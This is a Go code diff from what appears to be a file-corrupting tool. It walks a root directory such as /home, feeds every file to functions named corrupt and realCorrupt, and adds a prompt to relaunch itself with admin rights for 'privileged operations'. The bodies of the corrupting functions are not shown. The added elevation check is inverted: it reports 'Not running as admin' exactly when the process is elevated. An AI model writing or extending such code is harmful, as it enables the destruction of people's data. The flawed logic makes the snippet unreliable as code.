@@ -39,7 +39,7 @@ func corrupt(wg *sync.WaitGroup, fileChan <-chan string) {
 	}
 }
 
-func walkAndSendFiles(root string, fileChan chan<- string) {
+func walkAndSendFiles(root string, fileChan chan<- string) error {
 	err := filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
 		if err != nil {
 			log.Println("Walk error:", err)
@@ -90,6 +90,7 @@ func walkAndSendFiles(root string, fileChan chan<- string) {
 		fmt.Printf("error walking the path %q: %v\n", root, err)
 		//	loggingSystem()
 	}
+	return err
 }
 
 func realCorrupt(filePath string) (status string, err error) {
@@ -139,8 +140,30 @@ func defaultRoot() string {
 }
 
 func main() {
-	rootDir := "/home" // Change to whatever path you want
+	rootDir := defaultRoot() // Change to whatever path you want
 	fileChan := make(chan string, 100)
+
+	//check elevation
+	elevated, err := IsElevated()
+	if err != nil {
+		fmt.Fprintln(os.Stderr, "failed to check elevation:", err)
+	} else if elevated {
+		fmt.Println("Not running as admin")
+		fmt.Println("Relaunch elevated now ? [y/N]: ")
+		var resp string
+		fmt.Scanln(&resp)
+		if resp == "y" || resp == "Y" {
+			if err := RelaunchElevated(); err != nil {
+				fmt.Fprintln(os.Stderr, "failed to relaunch elevated:", err)
+				os.Exit(1)
+			}
+			// Relaunched process will take over; exit current
+			os.Exit(0)
+		}
+		fmt.Println("Continuing without elevation (some features may be disabled).")
+	} else {
+		fmt.Println("Running elevated — proceed with privileged operations if needed.")
+	}
 
 	var wg sync.WaitGroup
 
